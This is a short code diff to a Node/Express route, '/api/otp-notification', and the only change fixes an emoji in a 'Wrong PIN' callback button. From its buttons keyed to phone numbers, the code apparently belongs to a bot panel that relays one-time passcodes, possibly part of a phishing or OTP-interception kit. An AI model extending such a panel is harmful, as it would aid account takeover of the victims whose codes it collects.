@@ -162,7 +162,7 @@ app.post('/api/otp-notification', async (req, res) => {
                     ],
                     [
                         { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
-                        { text: "⚠️️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                     ],
                     [
                         { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
